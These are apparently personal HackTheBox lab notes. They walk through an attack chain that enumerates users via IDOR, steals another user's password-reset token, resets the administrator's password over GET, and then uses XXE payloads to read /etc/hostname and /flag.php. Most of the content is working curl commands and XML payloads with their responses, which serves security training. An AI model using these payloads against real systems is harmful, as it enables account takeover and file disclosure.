# HTB Web Attack Notes — IDOR → Token Disclosure → Password Reset

**Target**

```text
http://154.57.164.73:30679
```

**Session**

```text
PHPSESSID=viia8i3uhckic7g8qohfgnjsam
uid=74
```

> Replace the session values if yours change.

---

## 1. Identify the profile API

The profile page JavaScript contained:

```javascript
fetch(`/api.php/user/${$.cookie("uid")}`, {
    method: 'GET'
})
```

So the `uid` cookie controls which user ID is requested.

### Test UID 1

```bash
curl -i \
  'http://154.57.164.73:30679/api.php/user/1' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

Response:

```json
{
  "uid": "1",
  "username": "s.applewhite",
  "full_name": "Samanta Applewhite",
  "company": "Daniel Inc"
}
```

### Test UID 2

```bash
curl -i \
  'http://154.57.164.73:30679/api.php/user/2' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

This demonstrated that changing the object ID allows access to other users' information.

### Enumerate users

```bash
for i in {1..100}; do
    echo "===== UID $i ====="
    curl -s \
      "http://154.57.164.73:30679/api.php/user/$i" \
      -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
    echo
done
```

Important result:

```text
UID 52
username:  a.corrales
full_name: Amor Corrales
company:   Administrator
```

---

# 2. Discover the password-reset token endpoint

The profile/settings JavaScript contained:

```javascript
fetch(`/api.php/token/${$.cookie("uid")}`, {
    method: 'GET'
})
```

The token is then sent to:

```text
/reset.php
```

### Request UID 1's token

```bash
curl -i \
  'http://154.57.164.73:30679/api.php/token/1' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

Response:

```json
{
  "token": "e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c"
}
```

Notice that the session belongs to:

```text
uid=74
```

but the API returned a token for:

```text
uid=1
```

This is another IDOR-style authorization issue.

---

# 3. Save the token into a variable

```bash
TOKEN=$(curl -s \
  'http://154.57.164.73:30679/api.php/token/1' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' \
  | jq -r .token)

echo "$TOKEN"
```

Expected:

```text
e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c
```

---

# 4. Test `/reset.php`

Initially, POSTing another user's UID gave:

```text
Access Denied
```

Example:

```bash
curl -i -X POST \
  'http://154.57.164.73:30679/reset.php' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' \
  --data-urlencode 'uid=1' \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode 'password=HTBtest123!'
```

Response:

```text
Access Denied
```

---

# 5. Test HTTP methods

We discovered that `/reset.php` behaves differently depending on the HTTP method.

## GET

```bash
curl -i -G \
  'http://154.57.164.73:30679/reset.php' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' \
  --data-urlencode 'uid=1' \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode 'password=HTBtest123!'
```

Response:

```text
Password changed successfully
```

### Important

This was the critical finding:

```text
GET /reset.php
        +
uid=1
        +
valid token for UID 1
        +
new password
        ↓
Password changed successfully
```

---

## POST

```bash
curl -i -X POST \
  'http://154.57.164.73:30679/reset.php' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' \
  --data-urlencode 'uid=1' \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode 'password=HTBtest123!'
```

Result:

```text
Access Denied
```

---

## OPTIONS

```bash
curl -i -X OPTIONS \
  'http://154.57.164.73:30679/reset.php?uid=1&token=TOKEN&password=HTBtest123!' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

Earlier, with the current user's valid parameters, OPTIONS returned:

```text
Password changed successfully
```

There was no `Allow:` header.

---

## PUT

```bash
curl -i -X PUT \
  'http://154.57.164.73:30679/reset.php?uid=1&token=TOKEN&password=HTBtest123!' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

The application processed the request successfully in our testing.

---

## PATCH

```bash
curl -i -X PATCH \
  'http://154.57.164.73:30679/reset.php?uid=1&token=TOKEN&password=HTBtest123!' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

Also processed successfully in our testing.

---

## DELETE

```bash
curl -i -X DELETE \
  'http://154.57.164.73:30679/reset.php?uid=1&token=TOKEN&password=HTBtest123!' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

Also processed successfully in our testing.

---

## HEAD

```bash
curl -i -X HEAD \
  'http://154.57.164.73:30679/reset.php?uid=1&token=TOKEN&password=HTBtest123!' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74'
```

Returned:

```text
HTTP/1.1 200 OK
```

but no response body, which is normal for HEAD.

---

# 6. Investigate the Administrator account

The enumeration showed:

```text
UID:       52
Username:  a.corrales
Full name: Amor Corrales
Company:   Administrator
```

**Important correction:** initially we mistakenly used `a.batres`; the API confirmed the actual username is:

```text
a.corrales
```

Verify:

```bash
curl -s \
  'http://154.57.164.73:30679/api.php/user/52' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' | jq
```

Result:

```json
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

---

# 7. Obtain UID 52's token

```bash
TOKEN=$(curl -s \
  'http://154.57.164.73:30679/api.php/token/52' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' \
  | jq -r .token)

echo "$TOKEN"
```

---

# 8. Reset UID 52's password using GET

```bash
curl -i -G \
  'http://154.57.164.73:30679/reset.php' \
  -H 'Cookie: PHPSESSID=viia8i3uhckic7g8qohfgnjsam; uid=74' \
  --data-urlencode 'uid=52' \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode 'password=HTBtest123!'
```

Result:

```text
Password changed successfully
```

Then the login credentials to test are:

```text
Username: a.corrales
Password: HTBtest123!
```

---

# Attack Chain

The complete chain is:

```text
Authenticated user
      |
      v
uid cookie = 74
      |
      v
/api.php/user/<uid>
      |
      +----> Change 74 to another UID
      |
      v
Enumerate users
      |
      v
UID 52
a.corrales
Administrator
      |
      v
/api.php/token/52
      |
      +----> Obtain token belonging to UID 52
      |
      v
/reset.php
      |
      +----> Use GET instead of POST
      |
      v
Password changed successfully
      |
      v
a.corrales : HTBtest123!
```

### Key vulnerabilities to remember

```text
1. IDOR
   /api.php/user/<uid>

2. Token disclosure / IDOR
   /api.php/token/<uid>

3. Improper authorization on password reset
   /reset.php accepts another user's UID/token

4. HTTP method handling issue
   GET succeeds where POST returned Access Denied

5. Sensitive operation exposed through GET/query parameters
```

**One-liner to remember the technique:**

> **Enumerate UID → retrieve victim token → use GET `/reset.php` with victim UID + token → password reset.**


### 1. New HTB instance

```
Target:
154.57.164.78:32410
```

Authenticated session:

```
PHPSESSID=r8tqvmq8kpaquckfogj01iu6qg
uid=52
```

The `uid=52` account had access to:

```
/event.php
/addEvent.php
```

---

### 2. Identify XML input

Normal request:

```
POST /addEvent.php HTTP/1.1
Content-Type: text/plain;charset=UTF-8
```

XML body:

```
<root>
    <name>test</name>
    <details>new</details>
    <date>2026-09-24</date>
</root>
```

Normal response:

```
Event 'test' has been created.
```

---

### 3. Test internal XML entity expansion

Payload:

```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test "ABC123">
]>
<root>
    <name>test</name>
    <details>&test;</details>
    <date>2026-09-24</date>
</root>
```

Response:

```
Event 'test' has been created.
```

This showed that entity processing was occurring in the XML parser.

The important observation was that putting the entity in `<name>` resulted in:

```
Event '' has been created.
```

while placing it in `<details>` allowed the entity value to be processed.

---

### 4. Confirm external entity resolution

Payload:

```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
    <name>XXE</name>
    <details>&xxe;</details>
    <date>2026-09-24</date>
</root>
```

Response:

```
Event 'ng-1174321-webattacksasmt-xymym-57657c4f8d-mxdcw
' has been created.
```

The returned value was the contents of:

```
/etc/hostname
```

Therefore:

```
External entity resolution: YES
Local file disclosure:       YES
```

---

### 5.Use PHP filter wrapper against `/flag.php`

Instead of reading the PHP file directly:

```
<!ENTITY xxe SYSTEM "file:///flag.php">
```

use the PHP stream wrapper:

```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
    <name>&xxe;</name>
    <details>xxe</details>
    <date>2026-09-24</date>
</root>
```

This **worked**.

![](Attachments/Pasted%20image%2020260922194100.png)

![](Attachments/Pasted%20image%2020260922194123.png)